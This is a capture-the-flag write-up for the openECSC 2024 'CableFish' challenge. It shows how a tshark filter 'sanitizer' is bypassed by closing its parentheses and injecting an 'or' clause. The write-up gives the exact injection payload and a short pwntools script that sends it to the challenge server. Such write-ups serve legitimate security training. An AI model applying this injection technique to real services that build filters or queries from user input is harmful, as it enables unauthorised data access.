# openECSC 2024 - Round 1

## [misc] CableFish (594 solves)
Welcome to our platform! Here you can do traffic analysis via TCP, isn't it awesome?

Just specify your filter, we will sanitize it (we want to make sure no sensitive data will be leaked) and you will be given the traffic!

This is a remote challenge, you can connect with:

`nc cablefish.challs.open.ecsc2024.it 38005`

Author: Matteo Protopapa <@matpro>

## Overview

The challenge description gives us a netcat endpoint. The server asks us a filter, that is used with tshark in order to display some packets of a network capture. The filter is modified so that we cannot read the packets containing `flag_placeholder`.

## Solution

In order to find the flag, we have to read the blacklisted packets. This can be easily done injecting special characters, similarly to the single quote in SQL injections. In fact, the "sanitized" filter is obtained wrapping the filter provided by the user with `((...) and (not frame contains "flag_placeholder"))`. By closing the parenthesis two times, we can obtain an unconstrained filter. We fix syntax error by reopening the parenthesis, just after the insertion of an `or` operator (so that the two parts of the filter are independent). There are multiple working payloads, for example `frame contains "flag_placeholder")) or ((udp`, resulting in `((frame contains "flag_placeholder")) or ((udp) and (not frame contains "flag_placeholder"))`.

## Exploit

```python
r = remote(HOST, PORT)
r.recvuntil(b'filter: ')
r.sendline(b'frame contains "flag_placeholder")) or ((udp')
r.recvuntil(b'))\n\n')
print(r.recvall(timeout=5))
```
